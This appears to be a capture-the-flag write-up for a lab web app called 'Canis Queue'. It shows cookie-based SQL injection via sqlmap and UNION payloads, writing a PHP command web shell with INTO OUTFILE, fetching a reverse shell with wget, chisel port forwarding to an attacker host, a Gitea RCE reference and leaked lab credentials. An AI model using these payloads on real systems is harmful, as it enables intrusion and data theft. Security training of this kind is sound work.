<!-- 5/100 -->

# NMAP

```bash
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDrxDlZxvJUZk2qXaeBdjHxfM3MSGpZ8H6zPqgarnP3K806zE1Y/CryyT4wgIZYomtV8wUWHlFkuqbWjcKcM1MWcPjzGWfPZ2wHTNgUkHvBWZ+fxoX8vJoC6wfpifa7bSMaOItFWSLnMGOXigHbF6dPNyP+/kXAJE+tg9TurrTKaPiL6u+02ITeVUuLWsjwlLDJAnu1zDhPONR2b7WTcU/zQxHUYZiHpHn5eBtXpCZPZyfOZ+828ibobM/CAHIBZqJsYksAe5RbtDw7Vdw/8OtYuo4Koz8C2kBoWCHvsmyDfwZ57E2Ycss4JG5j7fMt7sI+lh/NHE+/7zrXdH/4njCD
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMlni4gM6dVkvfGeMy6eg/18HsCYvvFhbpycXiGYM3fitNhTXW4WpMpr8W/0y2FszEB6TGD93ib/lCTsBOQG5Uw=
|   256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICQIHukp5WpajvhF4juRWmL2+YtbN9HbhgLScgqYNien

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Canis Queue
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

![image](https://user-images.githubusercontent.com/68326057/120881117-83da2f00-c5ec-11eb-83b8-3a36accb5db1.png)


![image](https://user-images.githubusercontent.com/68326057/120881153-dae00400-c5ec-11eb-876c-5b0e8e40790c.png)

```bash
 echo "69" | md5sum                   
105be3ebd0677ec739afd851a6d87fd5 
```

I put this value in cookie

![image](https://user-images.githubusercontent.com/68326057/120881166-f64b0f00-c5ec-11eb-8ad7-cce5712d0796.png)

![image](https://user-images.githubusercontent.com/68326057/120881281-8b4e0800-c5ed-11eb-8ce2-bfbe40fce0a9.png)

--> https://superuser.com/questions/747551/how-do-i-check-for-sql-injection-in-cookie

```bash
sqlmap --cookie="id=705e3461bba168a8e922ecff55333463" -u "http://10.10.88.196/index.php" -p "id" --level 3 --dbms=MYSQL
```

![image](https://user-images.githubusercontent.com/68326057/120881781-34e2c880-c5f1-11eb-993b-2821c69ea476.png)

This Cookie 
```bash
fd85017c2cb1a48ca54393998b40d857' order by 1 #
```

![image](https://user-images.githubusercontent.com/68326057/121206291-f7eb3000-c895-11eb-991a-96d29c41f72a.png)


![image](https://user-images.githubusercontent.com/68326057/121206387-0afe0000-c896-11eb-9f60-df79e9bb9846.png)

So there is only 2 column.

## Union Statement

--> http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

```bash
fd85017c2cb1a48ca54393998b40d857' union all select null,system_user() #
```

![image](https://user-images.githubusercontent.com/68326057/121207163-b0b16f00-c896-11eb-9cf0-9406d75bc022.png)

![image](https://user-images.githubusercontent.com/68326057/121207424-e48c9480-c896-11eb-8b4f-1d8467cd134d.png)

![image](https://user-images.githubusercontent.com/68326057/121207689-1dc50480-c897-11eb-978b-4de3f6281bf6.png)

Database : webapp

![image](https://user-images.githubusercontent.com/68326057/121208360-a2178780-c897-11eb-8e71-f01daf7a6b98.png)

![image](https://user-images.githubusercontent.com/68326057/121208428-ac398600-c897-11eb-8a23-cd1bd316311b.png)

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
```

So there is a user name dylan.

```bash
fd85017c2cb1a48ca54393998b40d857' union all select null,LOAD_FILE('/var/www/html/index.php')  #
```

```php
<?php
	$badStrings=array("3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f646f672f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a", "DUMPFILE", "SLEEP", "LOADFILE", "AND", ">", "<", "CONCAT", "IF", "ELT", "0,1");
	$stringsLen=count($badStrings);


	require_once "config.php";

	if(!isset($_COOKIE["id"])){
		$cookie = bin2hex(random_bytes(16));
		$queueNum = rand(1,100);
		setcookie("id", $cookie, NULL, "/");
		
		$sql = "INSERT INTO queue VALUES ('". $cookie . "',". $queueNum .")";
		if(!$dbh->query($sql) === TRUE){
			die("Error: " . $dbh->error);
		}
	}
	else {
		$cookie = $_COOKIE["id"];
		for($x=0; $x<$stringsLen;$x++){
			if (strstr($cookie, $badStrings[$x]) !== false){
				die("RCE Attempt detected");
			}
		}
		$sql = "SELECT * FROM queue WHERE userID='". $cookie . "'";
		$result = $dbh->query($sql);
		if(!$result === TRUE){
			die("Error: " . $dbh->error);
		}
		else if ($result->num_rows > 0){
			while($row =  $result->fetch_assoc()){
				$queueNum = $row["queueNum"];
			}
		}
		else{
			$queueNum = "Error";
		}
	}
?>

<!DOCTYPE html>
<html>
	<head>
		<title>Canis Queue</title>
		<meta charset=utf-8>
		<meta name="viewport" content="width=device-width, user-scalable=no">
		<link rel="stylesheet" type="text/css" href="assets/css/dancing.css">
		<link rel="stylesheet" type="text/css" href="assets/css/alegreya.css">
		<link rel="stylesheet" type="text/css" href="assets/css/style.css">
	</head>
	<body>
		<div id="background"></div>
		<main>
			<h1>Canis Queueing</h1>
			<h2>Where we queue for the sake of queueing -- like all good Brits!</h2>
			<p>You are number <?php echo $queueNum;?> in the queue</p>
		</main>
	</body>
</html>
```

![image](https://user-images.githubusercontent.com/68326057/121209478-7d6fdf80-c898-11eb-84fd-b5f7bf89ecff.png)

![image](https://user-images.githubusercontent.com/68326057/121209769-c2941180-c898-11eb-9fd5-d9dda7b510f0.png)

```bash
web:Cda3RsDJga
```

I can't access /var/log/apache2/access.log file.

So I went back to index.php code And analyse the badString.

It Looks like a Hex string.

--> https://www.rapidtables.com/convert/number/hex-to-ascii.html

```php
<?php
if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=/var/www/dog/> <input type=submit name=upload value=upload></form>";}?>

```

![image](https://user-images.githubusercontent.com/68326057/121212969-71d1e800-c89b-11eb-9c90-72a96759e8e0.png)

From 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based

```bash
fd85017c2cb1a48ca54393998b40d857' union all select null,0x3c3f70687020706870696e666f28293b203f3e into outfile '/var/www/html/shell.php' #
```

![image](https://user-images.githubusercontent.com/68326057/121213220-aba2ee80-c89b-11eb-98dc-8dd8839e6760.png)

![image](https://user-images.githubusercontent.com/68326057/121213552-f3c21100-c89b-11eb-9fee-d0fa6b95ddb2.png)

```bash
fd85017c2cb1a48ca54393998b40d857' union all select null,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e  into outfile '/var/www/html/rev.php' #
```

![image](https://user-images.githubusercontent.com/68326057/121214003-616e3d00-c89c-11eb-8c30-ee17843e6665.png)

Upload Pentest Monkey php-ReverShell using wget

![image](https://user-images.githubusercontent.com/68326057/121214494-c9bd1e80-c89c-11eb-8806-b1fa11cea8bb.png)

# User www-data

![image](https://user-images.githubusercontent.com/68326057/121214612-e6595680-c89c-11eb-8ecf-907b7db462b0.png)

![image](https://user-images.githubusercontent.com/68326057/121214753-0db02380-c89d-11eb-9018-565d3868d58d.png)


![image](https://user-images.githubusercontent.com/68326057/121215167-68497f80-c89d-11eb-974d-27ccb250d655.png)

![image](https://user-images.githubusercontent.com/68326057/121216354-7350df80-c89e-11eb-8bdd-a968a46ebc63.png)

![image](https://user-images.githubusercontent.com/68326057/121216281-60d6a600-c89e-11eb-90d9-9c32a9324881.png)

```bash
dylan:Labr4d0rs4L1f3
```

![image](https://user-images.githubusercontent.com/68326057/121216571-a5624180-c89e-11eb-9a42-ca4c133fbaca.png)


# User - Dylan

![image](https://user-images.githubusercontent.com/68326057/121217026-11dd4080-c89f-11eb-9798-7f13105053d3.png)

So Now we can use ssh to port forward.

Used chisel to port forward

On attacker
```bash
./chisel server --reverse --port 999
```

On victim
```bash
./chisel client 10.10.9.53:9999 R:3000:127.0.0.1:3000
```

![image](https://user-images.githubusercontent.com/68326057/121219030-ea877300-c8a0-11eb-9414-027be4050510.png)

![image](https://user-images.githubusercontent.com/68326057/121219423-4ce07380-c8a1-11eb-9719-6b43a198e72d.png)

![image](https://user-images.githubusercontent.com/68326057/121250156-04d24880-c8c3-11eb-9378-57bd6f541026.png)

--> https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/

```bash
git clone http://localhost:3000/<USER>/<REPO> && cd <REPO>
echo "test" >> README.md
git add README.md
git commit -m "Exploit"
git push
```

![image](https://user-images.githubusercontent.com/68326057/121252930-33055780-c8c6-11eb-843c-b92003a4dc68.png)

![image](https://user-images.githubusercontent.com/68326057/121253212-79f34d00-c8c6-11eb-9825-d0f1c5581b9a.png)

Same as in gitea.

![image](https://user-images.githubusercontent.com/68326057/121254557-06ead600-c8c8-11eb-90c2-d60428825ed7.png)

![image](https://user-images.githubusercontent.com/68326057/121254784-4dd8cb80-c8c8-11eb-9a37-7826add19e13.png)

The Owner is dylan 
![image](https://user-images.githubusercontent.com/68326057/121254867-647f2280-c8c8-11eb-89a9-77816b8e3abf.png)

![image](https://user-images.githubusercontent.com/68326057/121254761-444f6380-c8c8-11eb-8c70-be3146c522a8.png)

![image](https://user-images.githubusercontent.com/68326057/121256326-0e12e380-c8ca-11eb-96dc-e817f4490a06.png)



